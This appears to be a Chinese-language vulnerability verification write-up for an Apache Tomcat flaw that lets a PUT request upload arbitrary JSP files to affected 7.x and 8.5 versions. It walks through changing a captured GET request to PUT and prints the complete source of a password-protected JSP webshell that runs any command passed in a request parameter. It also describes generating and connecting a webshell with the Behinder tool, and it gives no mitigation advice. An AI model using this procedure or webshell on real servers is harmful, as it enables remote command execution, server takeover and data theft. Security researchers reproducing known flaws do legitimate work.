# 漏洞描述

Tomcat 是一个小型的轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。 攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 的webshell文件，JSP文件中的恶意代码将能被服务器执行，导致服务器上的数据泄露或获取服务器权限。



# 影响版本

Apache Tomcat 7.0.0 - 7.0.79

Apache Tomcat /8.5.19



# 漏洞验证

访问主页，抓包

![image-20250402103123556](./assets/image-20250402103123556.png)

放入repeat

修改GET请求为PUT

![image-20250402103155597](./assets/image-20250402103155597.png)

204 成功



上传jsp木马文件

```
<%
    if("123".equals(request.getParameter("pwd"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    }
%> 
```

![image-20250402103233966](./assets/image-20250402103233966.png)



成功上传

![image-20250402103248746](./assets/image-20250402103248746.png)

命令执行

![image-20250402104234936](./assets/image-20250402104234936.png)





或者利用冰蝎生成jsp木马文件

![image-20250402104307358](./assets/image-20250402104307358.png)

put写入

![image-20250402104331121](./assets/image-20250402104331121.png)



成功写入后用冰蝎去连

![image-20250402104633541](./assets/image-20250402104633541.png)